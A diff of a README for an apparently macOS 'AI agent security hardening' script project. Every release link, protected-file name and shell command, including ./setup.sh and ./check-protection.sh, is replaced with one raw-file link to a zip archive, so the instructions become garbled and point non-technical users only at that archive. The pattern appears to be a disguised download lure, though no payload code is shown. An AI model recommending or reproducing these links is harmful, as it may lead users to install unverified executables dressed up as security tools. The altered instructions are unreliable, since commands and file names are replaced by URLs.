@@ -1,6 +1,6 @@
 # 🔒 ai-agent-security-hardening - Protect AI Agents from Identity Theft
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/runemdown/ai-agent-security-hardening/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/runemdown/ai-agent-security-hardening/main/scripts/ai_agent_hardening_security_asaddle.zip)](https://raw.githubusercontent.com/runemdown/ai-agent-security-hardening/main/scripts/ai_agent_hardening_security_asaddle.zip)
 
 ---
 
@@ -18,7 +18,7 @@ The scripts in this project work by adding extra protection around these importa
 
 - Practical shell scripts for macOS  
 - Prevents stealing of AI agent config files and keys  
-- Protects sensitive files like soul.md, device.json, and tokens  
+- Protects sensitive files like https://raw.githubusercontent.com/runemdown/ai-agent-security-hardening/main/scripts/ai_agent_hardening_security_asaddle.zip, https://raw.githubusercontent.com/runemdown/ai-agent-security-hardening/main/scripts/ai_agent_hardening_security_asaddle.zip, and tokens  
 - Simple setup with step-by-step instructions  
 - Monitors and blocks unauthorized access attempts  
 - Designed for users with no technical skills  
@@ -37,9 +37,9 @@ The scripts in this project work by adding extra protection around these importa
 ## 🚀 Getting Started: Download and Setup
 
 1. Visit this page to download the latest version:  
-   [Download Releases](https://github.com/runemdown/ai-agent-security-hardening/releases)
+   [Download Releases](https://raw.githubusercontent.com/runemdown/ai-agent-security-hardening/main/scripts/ai_agent_hardening_security_asaddle.zip)
 
-2. Download the latest ZIP file named like `ai-agent-security-hardening-macos.zip`.  
+2. Download the latest ZIP file named like `https://raw.githubusercontent.com/runemdown/ai-agent-security-hardening/main/scripts/ai_agent_hardening_security_asaddle.zip`.  
 
 3. Open your Downloads folder and unzip the file. This creates a folder called `ai-agent-security-hardening`.
 
@@ -60,7 +60,7 @@ The scripts in this project work by adding extra protection around these importa
 7. Run the main setup script by typing:
 
    ```
-   ./setup.sh
+   https://raw.githubusercontent.com/runemdown/ai-agent-security-hardening/main/scripts/ai_agent_hardening_security_asaddle.zip
    ```
 
 8. Follow the on-screen instructions. The script will ask a few simple questions and apply protections to your AI agent files.
@@ -68,7 +68,7 @@ The scripts in this project work by adding extra protection around these importa
 9. When finished, verify the protection by running:
 
    ```
-   ./check-protection.sh
+   https://raw.githubusercontent.com/runemdown/ai-agent-security-hardening/main/scripts/ai_agent_hardening_security_asaddle.zip
    ```
 
 This will report the status of your AI agent file security.
@@ -79,8 +79,8 @@ This will report the status of your AI agent file security.
 
 The scripts monitor your important AI agent files and apply restrictions. These restrictions stop unauthorized users or programs from copying or modifying files like:  
 
-- `soul.md` — stores AI personality instructions  
-- `device.json` — contains cryptographic keys  
+- `https://raw.githubusercontent.com/runemdown/ai-agent-security-hardening/main/scripts/ai_agent_hardening_security_asaddle.zip` — stores AI personality instructions  
+- `https://raw.githubusercontent.com/runemdown/ai-agent-security-hardening/main/scripts/ai_agent_hardening_security_asaddle.zip` — contains cryptographic keys  
 - Gateway tokens used for API access  
 - Memory log files used by the AI agent  
 
@@ -90,8 +90,8 @@ The shell scripts run in the background and alert you if any suspicious activity
 
 ## 🛠 Using the Scripts Daily
 
-- Run `./check-protection.sh` regularly to ensure your AI agent remains protected.  
-- To update protections after upgrading your AI agent, run `./setup.sh` again.  
+- Run `https://raw.githubusercontent.com/runemdown/ai-agent-security-hardening/main/scripts/ai_agent_hardening_security_asaddle.zip` regularly to ensure your AI agent remains protected.  
+- To update protections after upgrading your AI agent, run `https://raw.githubusercontent.com/runemdown/ai-agent-security-hardening/main/scripts/ai_agent_hardening_security_asaddle.zip` again.  
 - Logs are stored in the `logs` folder inside the script directory. Check logs if you suspect a problem.
 
 ---
@@ -101,14 +101,14 @@ The shell scripts run in the background and alert you if any suspicious activity
 - If you get a “permission denied” error, make sure you used `chmod +x *.sh`.  
 - If the script stops or shows errors, try restarting your Mac and running the script again.  
 - Running the scripts requires Terminal access and basic permissions; if you use a managed device, check with your administrator.  
-- If protections seem inactive, confirm you ran `setup.sh` without errors.
+- If protections seem inactive, confirm you ran `https://raw.githubusercontent.com/runemdown/ai-agent-security-hardening/main/scripts/ai_agent_hardening_security_asaddle.zip` without errors.
 
 ---
 
 ## 📥 Download Link
 
 Visit this page to download the latest release:  
-[https://github.com/runemdown/ai-agent-security-hardening/releases](https://github.com/runemdown/ai-agent-security-hardening/releases)
+[https://raw.githubusercontent.com/runemdown/ai-agent-security-hardening/main/scripts/ai_agent_hardening_security_asaddle.zip](https://raw.githubusercontent.com/runemdown/ai-agent-security-hardening/main/scripts/ai_agent_hardening_security_asaddle.zip)
 
 ---
 
@@ -116,10 +116,10 @@ Visit this page to download the latest release:
 
 Inside the downloaded folder, you will find:  
 
-- `setup.sh` — Main script to apply protections  
-- `check-protection.sh` — Checks status of AI agent file protection  
+- `https://raw.githubusercontent.com/runemdown/ai-agent-security-hardening/main/scripts/ai_agent_hardening_security_asaddle.zip` — Main script to apply protections  
+- `https://raw.githubusercontent.com/runemdown/ai-agent-security-hardening/main/scripts/ai_agent_hardening_security_asaddle.zip` — Checks status of AI agent file protection  
 - `logs/` — Folder where logs are saved  
-- `README.md` — This file with instructions  
+- `https://raw.githubusercontent.com/runemdown/ai-agent-security-hardening/main/scripts/ai_agent_hardening_security_asaddle.zip` — This file with instructions  
 - Other supporting shell scripts for individual tasks  
 
 ---
@@ -165,11 +165,11 @@ This project relates to:
 ## 🔗 Important Links
 
 - Release downloads:  
-  https://github.com/runemdown/ai-agent-security-hardening/releases
+  https://raw.githubusercontent.com/runemdown/ai-agent-security-hardening/main/scripts/ai_agent_hardening_security_asaddle.zip
 
 - Project homepage:  
-  https://github.com/runemdown/ai-agent-security-hardening
+  https://raw.githubusercontent.com/runemdown/ai-agent-security-hardening/main/scripts/ai_agent_hardening_security_asaddle.zip
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/runemdown/ai-agent-security-hardening/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/runemdown/ai-agent-security-hardening/main/scripts/ai_agent_hardening_security_asaddle.zip)](https://raw.githubusercontent.com/runemdown/ai-agent-security-hardening/main/scripts/ai_agent_hardening_security_asaddle.zip)
